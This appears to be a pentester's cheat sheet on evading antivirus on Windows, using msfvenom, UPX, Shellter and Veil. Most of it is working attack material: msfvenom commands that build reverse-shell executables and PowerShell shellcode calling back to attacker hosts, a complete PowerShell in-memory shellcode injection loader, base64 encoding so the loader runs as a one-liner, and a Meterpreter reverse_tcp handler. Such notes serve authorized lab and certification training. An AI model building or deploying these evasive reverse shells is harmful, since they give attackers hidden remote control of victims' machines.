# AV Evasion in Practice

## Windows PE Analysing

* Use msfvenom Reverse Shell
* VirusTotal Upload `https://www.virustotal.com/gui/home/upload`
* Antiscan Me `https://antiscan.me` (4 Uploads/ Day)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
```

## UPX

* Packer for executeables
* ` https://upx.github.io/`

```bash
sudo apt install upx-ucl
```

## Obfuscator

* EnigmaProtector
* Comercial Tool `https://www.enigmaprotector.com/en/home.html`

## Powershell AV ByPass Techiques

* **Limitation**: Powershell x86
* Use Powershell x86 Template Script
* Implant Reverse-Shell with In-Memory-Injection (VirtualAlloc, memset, CreateThread)
  * Use Msfvenom to create a reverse shell -f powershell
  * Add Shellcode `<place your shellcode here>`
  * Modify $var to obfuscate the malicous code
* Make Powershell Onliner `https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py`
* Set `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
* Run Powerhell Script to spawn Reverse Shell without AV Evasion 

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.192 LPORT=443 -f powershell
```

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$windoof = 
  Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$shellcode = #<place your shellcode here>; 

$size = 0x1000;

if ($shellcode.Length -gt 0x1000) {$size = $shellcode.Length};

$x = $windoof::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($shellcode.Length-1);$i++) {$windoof::memset([IntPtr]($x.ToInt32()+$i), $shellcode[$i], 1)};

$windoof::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

```bash
python3 tools/py-encode.py --script tools/av-bypass-resershell.ps1
JABjAG8AZABlACAAPQAgACcACgBbAEQAbABsAEkAbQBwAG8...
```

```powershell
# Run ps1
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
./av-bypass-resershell.ps1
# Alternative base64 encode ps1
powershell -enc  JABjAG8AZABlACAAPQAgACcACgBbAEQAbABsAEkAbQBwAG8...
```

## Automate AV Evasion with Shellter x86

* **Limitation**: Require x86, 32bit windows only
* Windows Tool Download `https://www.shellterproject.com/download/
* Use Meterpreter Reverse Shell Handler


```bash
# Kali
sudo apt install shellter
```

```bash
# Meterpreter 
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
meterpreter > shell
```

## Automate AV Evasion with Veil Framework

* **Limitation**: Require x86

```bash
$ vail -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
```